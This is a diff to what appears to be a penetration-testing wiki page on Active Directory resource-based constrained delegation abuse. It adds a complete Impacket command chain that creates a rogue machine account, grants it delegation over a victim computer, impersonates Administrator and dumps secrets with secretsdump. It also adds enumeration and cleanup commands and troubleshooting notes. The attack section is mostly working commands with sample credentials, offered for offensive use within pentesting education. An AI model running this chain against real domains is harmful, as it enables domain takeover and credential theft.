@@ -78,7 +78,7 @@ msds-allowedtoactonbehalfofotheridentity
 {1, 0, 4, 128...}
 ```
 
-### Performing a complete S4U attack
+### Performing a complete S4U attack (Windows/Rubeus)
 
 First of all, we created the new Computer object with the password `123456`, so we need the hash of that password:
 
@@ -102,6 +102,32 @@ rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:admin
 > [!CAUTION]
 > Note that users have an attribute called "**Cannot be delegated**". If a user has this attribute to True, you won't be able to impersonate him. This property can be seen inside bloodhound.
 
+### Linux tooling: end-to-end RBCD with Impacket (2024+)
+
+If you operate from Linux, you can perform the full RBCD chain using the official Impacket tools:
+
+```bash
+# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
+impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'
+
+# 2) Grant RBCD on the target computer to FAKE01$
+#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
+impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'
+
+# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
+impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'
+
+# 4) Use the ticket (ccache) against the target service
+export KRB5CCNAME=$(pwd)/Administrator.ccache
+# Example: dump local secrets via Kerberos (no NTLM)
+impacket-secretsdump -k -no-pass Administrator@victim.domain.local
+```
+
+Notes
+- If LDAP signing/LDAPS is enforced, use `impacket-rbcd -use-ldaps ...`.
+- Prefer AES keys; many modern domains restrict RC4. Impacket and Rubeus both support AES-only flows.
+- Impacket can rewrite the `sname` ("AnySPN") for some tools, but obtain the correct SPN whenever possible (e.g., CIFS/LDAP/HTTP/HOST/MSSQLSvc).
+
 ### Accessing
 
 The last command line will perform the **complete S4U attack and will inject the TGS** from Administrator to the victim host in **memory**.\
@@ -113,7 +139,55 @@ ls \\victim.domain.local\C$
 
 ### Abuse different service tickets
 
-Lear about the [**available service tickets here**](silver-ticket.md#available-services).
+Learn about the [**available service tickets here**](silver-ticket.md#available-services).
+
+## Enumerating, auditing and cleanup
+
+### Enumerate computers with RBCD configured
+
+PowerShell (decoding the SD to resolve SIDs):
+
+```powershell
+# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
+Import-Module ActiveDirectory
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
+  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
+  ForEach-Object {
+    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
+    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
+    $sd.DiscretionaryAcl | ForEach-Object {
+      $sid  = $_.SecurityIdentifier
+      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
+      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
+    }
+  }
+```
+
+Impacket (read or flush with one command):
+
+```bash
+# Read who can delegate to VICTIM
+impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
+```
+
+### Cleanup / reset RBCD
+
+- PowerShell (clear the attribute):
+
+```powershell
+Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
+# Or using the friendly property
+Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
+```
+
+- Impacket:
+
+```bash
+# Remove a specific principal from the SD
+impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
+# Or flush the whole list
+impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
+```
 
 ## Kerberos Errors
 
@@ -124,6 +198,21 @@ Lear about the [**available service tickets here**](silver-ticket.md#available-s
   - The user you are trying to impersonate cannot access the desired service (because you cannot impersonate it or because it doesn't have enough privileges)
   - The asked service doesn't exist (if you ask for a ticket for winrm but winrm isn't running)
   - The fakecomputer created has lost it's privileges over the vulnerable server and you need to given them back.
+  - You are abusing classic KCD; remember RBCD works with non-forwardable S4U2Self tickets, while KCD requires forwardable.
+
+## Notes, relays and alternatives
+
+- You can also write the RBCD SD over AD Web Services (ADWS) if LDAP is filtered. See:
+
+{{#ref}}
+adws-enumeration.md
+{{#endref}}
+
+- Kerberos relay chains frequently end in RBCD to achieve local SYSTEM in one step. See practical end-to-end examples:
+
+{{#ref}}
+../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
+{{#endref}}
 
 ## References
 
@@ -132,9 +221,8 @@ Lear about the [**available service tickets here**](silver-ticket.md#available-s
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
 - [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
 - [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
+- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
 
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
